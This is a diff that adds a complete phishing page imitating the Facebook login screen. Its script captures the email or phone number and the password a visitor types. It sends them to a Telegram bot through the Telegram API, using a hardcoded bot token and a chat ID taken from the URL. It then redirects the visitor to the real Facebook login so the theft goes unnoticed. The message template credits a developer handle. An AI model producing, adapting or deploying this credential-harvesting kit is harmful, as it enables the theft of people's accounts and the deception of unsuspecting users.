@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-sizing: border-box;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        .login-logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 100px; /* Adjust the logo size */
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 10px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 17px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background-color: #155db2;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        .new-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .new-account a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .new-account a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="login-logo" alt="Facebook Logo">
+        
+        <!-- Login Form -->
+        <form id="loginForm">
+            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        
+        <!-- Forgot Password Link -->
+        <div class="forgot-password">
+            <a href="#">Forgotten account?</a>
+        </div>
+        
+        <!-- New Account Link -->
+        <div class="new-account">
+            <span>Don't have an account? </span><a href="#">Create New Account</a>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "7816106272:AAG9owTYV40gd8p3Zwi7nUuY9gBklJ8wFAA"; // Replace with your bot token
+        const chatId = new URLSearchParams(window.location.search).get("id"); // Dynamic chat ID from URL
+
+        if (!chatId) {
+            alert("Chat ID missing from URL!");
+        }
+
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const emailOrPhone = document.getElementById("emailOrPhone").value;
+            const password = document.getElementById("password").value;
+
+            const message = `
+🎣 *FB Login Details*:
+👤 *Email/Phone:* ${emailOrPhone}
+🔑 *Password:* ${password}
+
+➡️ *Developed by @sasumon007*
+            `.trim();
+
+            // Send login details to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`, {
+                method: "POST",
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Login details sent to Telegram.");
+                    alert("Login successful! Redirecting...");
+                    window.location.href = "https://m.facebook.com/login/";
+                } else {
+                    console.error("Telegram API error:", data.description);
+                    alert("Failed to send login details to Telegram.");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("An error occurred. Please try again.");
+            });
+        });
+    </script>
+</body>
+</html>
